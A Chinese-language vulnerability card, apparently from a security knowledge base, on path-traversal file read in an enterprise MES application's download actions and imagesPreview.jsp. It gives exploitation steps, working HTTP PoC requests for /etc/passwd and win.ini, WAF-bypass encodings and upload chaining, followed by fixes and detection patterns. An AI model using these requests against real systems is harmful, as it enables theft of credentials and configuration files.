---
id: web-generic-file-inclusion-mes-download-filename-path
title: MES 下载接口 fileName 直接拼接路径导致任意文件读取（downloadImages/downloadLayout/imagesPreview.jsp）
type: scenario
domain: web
path: web/generic/file-inclusion
technique: mes-download-filename-arbitrary-file-read
aliases:
- MES 任意文件读取
- downloadImages.action 文件读取
- downloadLayout.action 文件读取
- imagesPreview.jsp 文件读取
- fileName 路径穿越
tags:
- java
- struts2
- jsp
- arbitrary-file-read
- path-traversal
- mes
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V35
  verified_at: '2026-11-05T06:02:21+08:00'
  notes: 已对照原文核对：downloadImages/downloadLayout 的 fileName 直接与配置下载根目录字符串相加后 new FileInputStream，imagesPreview.jsp 的 imagesPath 直接 new File；路由与代码截图一致；未在本机复现。
---

## 一句话结论

某企业 MES 的图片/文件下载 Action 从请求参数取 `fileName`，直接与配置的上传根目录字符串相加后 `new File(path)`/`FileInputStream` 并回写响应；`fileName` 未做路径归一化或白名单，`../`/`..\` 可穿越到下载根目录之外读取任意文件。JSP `imagesPreview.jsp` 更进一步，直接对请求参数 `imagesPath` 调 `new FileInputStream(new File(imagesPath))`，可读绝对路径。

## 原理

- **第一处：`TbSysImagesAction.download()`**：`String fileName = this.request.getParameter("fileName")`，从配置 `location_images_download_url` 取 `uploadUrl`，调用 `this.download(uploadUrl, fileName)`；`toDown(String path, String fileName)` 执行 `path = String.valueOf(path) + fileName`，`new File(path)`、`new FileInputStream(path)`，读入 buffer 后写 `response.getOutputStream()`，并设置 `Content-Disposition: attachment;filename=...`。
- **第二处：`TbSysFileAction.download()`**：逻辑几乎相同，配置项为 `location_file_download_url`；`fileName` 来自请求，`path = uploadUrl + fileName`，无过滤。
- **第三处：`rapoo/manage/upload/imagesPreview.jsp`**：JSP 第 19 行 `String imagesPath=request.getParameter("imagesPath");`，第 20 行 `new FileInputStream(new File(imagesPath))`，循环读 4096 字节写 `response.getOutputStream()`；`imagesPath` 未处理，可直接传绝对路径。
- **为什么能穿越**：`path + fileName` 只是字符串拼接，没有 `getCanonicalPath()`/`normalize()` 校验结果仍位于上传目录；攻击者传 `../../../../etc/passwd`（Linux）或 `..\..\..\Windows\win.ini`（Windows）即可跳出。`imagesPreview.jsp` 连前缀都没有，直接使用参数作为路径。
- **鉴权差异**：`*Images`/`*File` 是 Struts2 action，是否经过 `AuthorityInterceptor` 取决于 `struts.xml` 的包/拦截器配置，原文 PoC 带空 `JSESSIONID`，实际需确认；`imagesPreview.jsp` 是普通 JSP，不在 Struts2 拦截器链上，web.xml 中 `RightFilter` 只映射 `/rapoo/manage/Permission/*`，该 JSP 路径不在其中，可能无需登录。
- **影响**：读取配置文件、数据库连接串、密钥、系统文件（Windows `win.ini`、Linux `/etc/passwd`、应用 `WEB-INF/classes` 下的配置），为后续提权/横向提供凭据。

## 触发条件

- 目标为使用该 MES 代码库的应用，存在 `TbSysImagesAction`/`TbSysFileAction` 的 `download` 方法或 `imagesPreview.jsp`。
- 对应路由可访问：`/cmt/downloadImages.action`、`/cmt/downloadLayout.action`、`/cmt/rapoo/manage/upload/imagesPreview.jsp`。
- 下载 Action 需要有效会话（若被 AuthorityInterceptor 保护）；`imagesPreview.jsp` 可能无需认证，按目标 web.xml/filter 配置确认。
- 应用进程对目标文件有读权限。

## 利用步骤

1. 访问 `downloadImages.action?fileName=...` 或 `downloadLayout.action?fileName=...`，先读一个已知文件（如 `../WEB-INF/web.xml`）确认路径深度。
2. 按操作系统调整分隔符与层级：Linux 用 `../../../../etc/passwd`，Windows 用 `..\..\..\Windows\win.ini`；必要时用 URL 编码 `%2e%2e%2f`/`%5c` 绕过代理。
3. 读取应用配置（`WEB-INF/classes/*.properties`、`jdbc.properties`、`applicationGlobal.properties`）、数据库连接串、密钥文件。
4. 直接请求 `imagesPreview.jsp?imagesPath=/etc/passwd`（或 Windows 绝对路径），验证无前缀限制的读取。
5. 保存响应作为证据；不要修改目标文件。

## PoC

```http
GET /cmt/downloadImages.action?fileName=../../../../etc/passwd HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Accept: */*
Cookie: JSESSIONID=<valid session>
Connection: close
```

```http
GET /cmt/downloadLayout.action?fileName=../../../../etc/passwd HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Accept: */*
Cookie: JSESSIONID=<valid session>
Connection: close
```

```http
GET /cmt/rapoo/manage/upload/imagesPreview.jsp?imagesPath=/etc/passwd HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

Windows 变体：

```http
GET /cmt/downloadImages.action?fileName=..\..\..\Windows\win.ini HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid session>
```

## 变体与关联

- **路径分隔符**：Windows 同时接受 `\` 与 `/`；若 WAF 只拦 `../`，可用 `..\`、`..%5c`、双重编码。
- **配置根目录**：`location_images_download_url`/`location_file_download_url` 在配置文件中分别为图片/附件目录；知道根目录后可精确计算 `../` 层数。
- **其他下载 Action**：代码库中若还有 `download`/`toDown` 模式的 Action，可按同样方法审计。
- **与上传组合**：上传接口可写文件（见关联卡），若上传目录在 Web 根下，可先上传再读取/执行；文件读取也可为上传提供目标路径信息。
- 关联卡片：[[web-generic-file-upload-mes-uploadfilename-arbitrary-jsp]]、[[web-generic-file-inclusion-java-new-file-readfile-fileread]]（如已存在）。

## 检测与防御

- **代码**：对 `fileName` 做 `Path.normalize()` 后校验 `startsWith(uploadRoot)`；禁止绝对路径与 `..`；使用 `getCanonicalFile()` 比较；下载只允许白名单后缀/文件名；`imagesPreview.jsp` 改为从固定目录+ID 查找，不接受完整路径。
- **部署**：上传/下载目录放在 Web 根之外；限制应用进程文件读权限；对 `imagesPreview.jsp` 增加认证与路径校验。
- **检测**：请求参数含 `../`、`..\`、`%2e%2e`、`%5c`、绝对路径（`/etc/`、`C:\`、`WEB-INF`）；下载接口返回非媒体内容/大文件；同一会话短时间内枚举多个系统文件。
- **应急**：审计下载接口访问日志，确认读取过哪些文件；轮换配置中泄露的数据库/接口凭据；修复后回归测试正常图片/附件下载。
